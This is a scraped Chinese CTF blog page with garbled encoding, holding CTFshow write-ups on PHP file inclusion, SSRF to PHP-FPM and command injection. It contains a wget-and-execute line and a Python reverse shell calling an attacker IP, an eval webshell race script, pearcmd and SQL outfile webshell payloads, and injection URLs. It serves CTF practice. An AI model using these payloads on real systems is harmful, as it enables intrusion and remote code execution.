<pre class="line-numbers language-none"><code class="language-none">wget æ”»å‡»ç«¯IP&#x2F;shell.txt -O &#x2F;tmp&#x2F;shell.php &amp;&amp; php &#x2F;tmp&#x2F;shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>pythonè„šæœ¬åå¼¹</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
#-*- coding: utf-8 -*-
import socket,subprocess,os
s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&quot;æ”»å‡»ç«¯IP&quot;,æ”»å‡»ç«¯ç›‘å¬ç«¯å£)) #æ›´æ”¹localhostä¸ºâ¾ƒâ¼°çš„å¤–â½¹ip,ç«¯â¼ä»»æ„
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;])
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>808</strong></p>

        <h3 id="å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«-1"   >
          <a href="#å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«-1" class="headerlink" title="å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a>å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«</h3>
      <pre class="line-numbers language-none"><code class="language-none">import requests
import threading
import sys
session&#x3D;requests.session()
sess&#x3D;&#39;yu22x&#39;
url1&#x3D;&quot;http:&#x2F;&#x2F;97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show&#x2F;&quot;
url2&#x3D;&#39;http:&#x2F;&#x2F;97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show&#x2F;?file&#x3D;&#x2F;tmp&#x2F;sess_yu22x&#39;
data1&#x3D;&#123;
    &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?php eval($_POST[1]);?&gt;&#39;
&#125;
data2&#x3D;&#123;
    &#39;1&#39;:&#39;echo 11123;system(&quot;cat &#x2F;*&quot;);&#39;,
&#125;
file&#x3D;&#123;
    &#39;file&#39;:&#39;1&#39;
&#125;
cookies&#x3D;&#123;
    &#39;PHPSESSID&#39;: sess
&#125;
def write():
    while True:
        r &#x3D; session.post(url1,data&#x3D;data1,files&#x3D;file,cookies&#x3D;cookies)
def read():
    while True:
        r &#x3D; session.post(url2,data&#x3D;data2)
        if &#39;11123&#39; in r.text:
            print(r.text)

if __name__&#x3D;&#x3D;&quot;__main__&quot;:
    event&#x3D;threading.Event()
    with requests.session() as session:
        for i in range(1,30): 
            threading.Thread(target&#x3D;write).start()
        for i in range(1,30):
            threading.Thread(target&#x3D;read).start()
    event.set()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çº¯çº¯çœ‹è¿æ°”</p>
<p><strong>809</strong></p>

        <h3 id="pearæ–‡ä»¶åŒ…å«-RCE-1"   >
          <a href="#pearæ–‡ä»¶åŒ…å«-RCE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#pearæ–‡ä»¶åŒ…å«-RCE-1" class="headerlink" title="pearæ–‡ä»¶åŒ…å«/RCE"></a>pearæ–‡ä»¶åŒ…å«/RCE</h3>
      <p>æ–‡ç« <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html" >åœ¨æ­¤</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<blockquote>
<p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š<code>--with-pear</code>æ‰ä¼šå®‰è£…ã€‚</p>
<p>ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code>ã€‚</p>
<p>åŸæœ¬pear/pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹ã€‚</p>
<p>æˆ‘æœ€æ—©çš„æ—¶å€™æ˜¯åœ¨é˜…è¯»phpinfo()çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°Dockerç¯å¢ƒä¸‹çš„PHPä¼šå¼€å¯<code>register_argc_argv</code>è¿™ä¸ªé…ç½®ã€‚æ–‡æ¡£ä¸­å¯¹è¿™ä¸ªé€‰é¡¹çš„ä»‹ç»ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šï¼Œå¤§æ¦‚çš„æ„æ€æ˜¯ï¼Œå½“å¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œç”¨æˆ·çš„è¾“å…¥å°†ä¼šè¢«èµ‹äºˆç»™<code>$argc</code>ã€<code>$argv</code>ã€<code>$_SERVER[&#39;argv&#39;]</code>å‡ ä¸ªå˜é‡ã€‚</p>
<p>å¦‚æœPHPä»¥å‘½ä»¤è¡Œçš„å½¢å¼è¿è¡Œï¼ˆå³sapiæ˜¯cliï¼‰ï¼Œè¿™é‡Œå¾ˆå¥½ç†è§£ã€‚ä½†å¦‚æœPHPä»¥Serverçš„å½¢å¼è¿è¡Œï¼Œä¸”åˆå¼€å¯äº†<code>register_argc_argv</code>ï¼Œé‚£ä¹ˆè¿™å…¶ä¸­æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Ÿ</p>
<p>HTTPæ•°æ®åŒ…ä¸­çš„query-stringä¼šè¢«ä½œä¸ºargvçš„å€¼</p>
</blockquote>
<p>æœ€ç»ˆæ„é€ çš„payloadå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;phpinfo()?&gt;+&#x2F;tmp&#x2F;hello.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ­¤æ—¶/tmp/hello.phpæ–‡ä»¶ä¸­å°±æœ‰äº†æˆ‘ä»¬å†™å…¥çš„<code>&lt;?=phpinfo()?&gt;</code>ï¼Œæ–‡ä»¶åŒ…å«å³å¯</p>
<p><strong>810</strong></p>

        <h3 id="SSRFæ‰“PHP-FPM-1"   >
          <a href="#SSRFæ‰“PHP-FPM-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRFæ‰“PHP-FPM-1" class="headerlink" title="SSRFæ‰“PHP-FPM"></a>SSRFæ‰“PHP-FPM</h3>
      <p>æœ‰å·¥å…·ä¸ç”¨***</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206081711243.png"></p>
<p>è®°å¾—ä¼ å…¥çš„æ—¶å€™urlç¼–ç ä¸€ä¸‹</p>
<p><strong>811</strong></p>

        <h3 id="file-put-contentsæ‰“PHP-FPM"   >
          <a href="#file-put-contentsæ‰“PHP-FPM" class="heading-link"><i class="fas fa-link"></i></a><a href="#file-put-contentsæ‰“PHP-FPM" class="headerlink" title="file_put_contentsæ‰“PHP-FPM"></a>file_put_contentsæ‰“PHP-FPM</h3>
      <p>æ–‡ç« åœ¨<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/sdst_/article/details/118080811" >è¿™é‡Œ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ç”¨çš„yu22xå¸ˆå‚…çš„è„šæœ¬</p>
<ol>
<li><p>ä¼ªé€ ftpæœåŠ¡å™¨</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">4566</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#ç«¯å£å¯æ”¹</span>
s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span>
<span class="token comment">#Service ready for new user.</span>
<span class="token comment">#Client send anonymous username</span>
<span class="token comment">#USER anonymous</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#User name okay, need password.</span>
<span class="token comment">#Client send anonymous password.</span>
<span class="token comment">#PASS anonymous</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#User logged in, proceed. Logged out if appropriate.</span>
<span class="token comment">#TYPE I</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#Size /</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#EPSV (1)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span>
<span class="token comment">#PASV</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#QUIT</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>gopherusç”Ÿæˆpayload</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206082140193.png"></p>
</li>
<li><p>vpsç›‘å¬ä¼ å‚</p>
<pre class="line-numbers language-none"><code class="language-none">file&#x3D;ftp:&#x2F;&#x2F;x.x.x.x:4566&amp;content&#x3D;gopherusç”Ÿæˆçš„payload(åªå–ä¸‹åˆ’çº¿åé¢çš„å†…å®¹ï¼Œä¸”ä¸éœ€è¦å†æ¬¡ç¼–ç )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<p><strong>812</strong></p>

        <h3 id="PHP-FPMæœªæˆæƒ"   >
          <a href="#PHP-FPMæœªæˆæƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-FPMæœªæˆæƒ" class="headerlink" title="PHP-FPMæœªæˆæƒ"></a>PHP-FPMæœªæˆæƒ</h3>
      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/6352d546.html">CTFshowå…¶ä»–</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-06-12</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/6352d546.html" data-flag-title="CTFshowå…¶ä»–"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><p><strong>396</strong></p>
<p><code>parse_url</code>å‡½æ•°å°†ä¸€ä¸ªurlæ‹†åˆ†ä¸ºå¦‚ä¸‹å½¢å¼</p>
<p><img src="https://img-blog.csdnimg.cn/20210628090124739.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æ— éœ€ç»•è¿‡ï¼Œç›´æ¥æ„é€ </p>
<pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;http:&#x2F;&#x2F;l&#x2F;l;cat fl0g* &gt;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>397</strong></p>
<p>åŠ äº†ä¸ª/tmpä¹Ÿæ²¡å•¥åµç”¨ï¼ŒåŒä¸Šå³å¯</p>
<p><strong>398</strong></p>
<p>åœ¨hostå¤„åŠ äº†/;è¿‡æ»¤ï¼Œä¹Ÿæ²¡å•¥ç”¨</p>
<p><strong>399</strong></p>
<p>ä¸ºå•¥è·Ÿhostè¿‡ä¸å»å•Šï¼Œå¤šæ»¤äº†ä¸ª&gt;</p>
<p><strong>400</strong></p>
<p>è¿‡æ»¤httpä¹Ÿæ²¡ç”¨</p>
<p><strong>401</strong></p>
<p>åŒä¸Š</p>
<p><strong>402</strong></p>
<p>åœ¨schemeå¤„è¿‡æ»¤httpï¼Œæ¢ä¸ªåè®®å°±è¡Œ</p>
<p><strong>403</strong></p>
<pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$&#x2F;&#39;, $url[&#39;host&#39;]))&#123; 
        shell_exec(&#39;curl &#39;.$url[&#39;scheme&#39;].$url[&#39;host&#39;].$url[&#39;path&#39;]); 
    &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡ŒåŒ¹é…äº†ä¸€ä¸ªipåœ°å€ï¼Œä¸Šé¢payloadæ”¹ä¸€ä¸‹å°±è¡Œ</p>
<p><strong>405</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\/[A-Za-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\.|php/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'curl '</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç¬¬ä¸€ä¸ªåœ¨hostä¸­åŒ¹é…IPåœ°å€ï¼Œç¬¬äºŒä¸ªpathä¸èƒ½æœ‰å­—æ¯æ•°å­—ï¼Œç¬¬ä¸‰ä¸ªåè®®ä¸­éœ€è¦æœ‰php</p>
<p>æœ€ç»ˆpayloadå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;php:&#x2F;&#x2F;127.0.0.1;cat fl0g.php&gt; 1.txt;11&#x2F;a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>406</strong></p>
<p><code>filter_var</code>å‡½æ•°<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/lxfweb/p/13757525.html" >ç¼ºé™·</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿™é‡Œè¿‡æ»¤å™¨åœ¨éªŒè¯urlçš„åˆæ³•æ€§</p>
<pre class="line-numbers language-none"><code class="language-none">?url&#x3D;0:&#x2F;&#x2F;www.baidu.com;&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e&#x2F;**&#x2F;into&#x2F;**&#x2F;outfile&#x2F;**&#x2F;&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;4.php&quot;%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è®¿é—®4.phpåè®¿é—®1.txtå³å¯</p>
<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/3/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/head.png" alt="avatar"></div><p class="sidebar-ov-author__text">ç”Ÿå‘½ä¸æ¯ï¼ŒæŠ˜è…¾ä¸æ­¢ï¼</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/zhisenyu" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.youtube.com/channel/UCarZXyGTzWssmNANey0TC3g" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a><a class="sidebar-ov-social-item" href="z405454586" target="_blank" rel="noopener" data-popover="å¾®ä¿¡" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=405454586" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">74</div><div class="sidebar-ov-state-item__name">å½’æ¡£</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">11</div><div class="sidebar-ov-state-item__name">æ ‡ç­¾</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>J1an</span></div><div><span>ç”± <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> å¼ºåŠ›é©±åŠ¨</span><span> v6.0.0</span><span class="footer__devider">|</span><span>ä¸»é¢˜ - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">è®¿é—®äººæ•°</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">æµè§ˆæ€»é‡</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>å·²ç»æ˜¯Dest0g3çš„èœç‹—äº†</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="æœç´¢æ–‡ç« ï¼ˆæ”¯æŒå¤šå…³é”®è¯ï¼Œè¯·ç”¨ç©ºæ ¼åˆ†éš”ï¼‰"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="150" zIndex="-1"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.xml';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ æ–‡ç« æ— æ ‡é¢˜ ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
